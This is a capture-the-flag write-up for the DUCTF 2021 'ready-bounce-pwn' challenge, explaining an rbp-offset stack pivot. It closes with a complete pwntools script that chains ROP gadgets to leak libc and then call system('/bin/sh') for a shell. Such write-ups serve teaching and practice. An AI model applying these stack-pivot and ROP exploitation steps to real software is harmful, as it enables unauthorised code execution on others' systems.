# Challenge Overview

```
❯ checksec rbp
[*] '/DUCTF-2021/pwn/ready-bounce-pwn/challenge/rbp'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

The program prompts for our name and reads 24 bytes into a buffer (on the stack) before prompting us for our favourite number. It increments `rbp` by our favourite number and then returns.

# Solution

Decompiling the binary (i.e. with Ghidra or IDA) gives pseudo C code that looks like a very simple and not really vulnerable program. However, fuzzing some inputs to the `read_long` function will quickly lead to a crash. Looking into the disassembly, we see towards the end of `main`:

```
0x0000000000401239 <+100>:	call   0x4011a9 <read_long>
0x000000000040123e <+105>:	add    rbp,rax
0x0000000000401241 <+108>:	mov    eax,0x0
0x0000000000401246 <+113>:	leave
0x0000000000401247 <+114>:	ret
```

Peculiarly, the return value of `read_long` (i.e. our "favourite number") is added to `rbp` just before the function epilogue.

Recall that the `leave` instruction is equivalent to

```
mov rsp, rbp
pop rbp
```

and `ret` pops the value at the top of the stack and jumps to it.

Since we are able to offset `rbp` before `leave` is executed, we can effectively reposition the stack frame and control the return address. The most obvious candidate is to offset `rbp` so that the return address will be read from the user controlled buffer.

The exploit idea will be to build a ROP chain to leak libc, and then build another ROP chain to get a shell.

## Leaking libc

The buffer we can control is 24 bytes. I couldn't find a way to get a leak with less than 3 gadgets, so let's assume we need 3 gadgets to leak libc. But we'll also need to return back to main so that we can get another write to get a shell. This means we'll need at least 32 bytes to hold our ROP chain, but we only have a 24 byte buffer :(. Fortunately, there's a way to get an extra 8 bytes.

The function prologue looks like:

```
0x00000000004011d5 <+0>:	push   rbp
0x00000000004011d6 <+1>:	mov    rbp,rsp
0x00000000004011d9 <+4>:	sub    rsp,0x20
```

and the call to `read` looks like:

```
0x00000000004011fb <+38>:	lea    rax,[rbp-0x20]
0x00000000004011ff <+42>:	mov    edx,0x18
0x0000000000401204 <+47>:	mov    rsi,rax
0x0000000000401207 <+50>:	mov    edi,0x0
0x000000000040120c <+55>:	call   0x401050 <read@plt>
```

So if we go through one pass of `main` and return to `main+1`, then when we get to `read` in the second pass, `rbp` will be what we manipulated `rsp` into being in the first pass (which itself is affected by what we chose to offset `rbp` by). Since we offset `rbp` such that `rsp` ends up pointing to somewhere in the name buffer, this means `rbp-0x20` will point to somewhere before the start of where the name buffer was in the first pass. So we can fill the buffer with `main+1` in the first pass, and in the second pass we can write 3 gadgets and have a `main+1` at the end of the ROP chain for free!

## Getting a Shell

Now that we have a libc leak, we can find the addresses of `system` and `"/bin/sh"` in the provided libc and build a ROP chain to call `system("/bin/sh")`. Since we don't care about returning to `main`, we can easily do this with 24 bytes.

```py
from pwn import *

def write(name, offset):
    conn.sendafter('? ', name)
    conn.sendlineafter('? ', str(offset))

elf = ELF('../challenge/rbp')
conn = remote('0.0.0.0', 1337)

pop_rdi = 0x00000000004012b3

write(b'A'*8 + p64(elf.symbols['main'] + 0x1)*2, -0x20)
write(p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']), -0x28)

leak = u64(conn.recvline().strip().ljust(8, b'\x00'))
libc_base = leak - 0x809d0
log.success('libc base: ' + hex(libc_base))

system = libc_base + 0x4fa60
bin_sh = libc_base + 0x1abf05
write(p64(pop_rdi) + p64(bin_sh) + p64(system), -0x28)

conn.interactive()
```
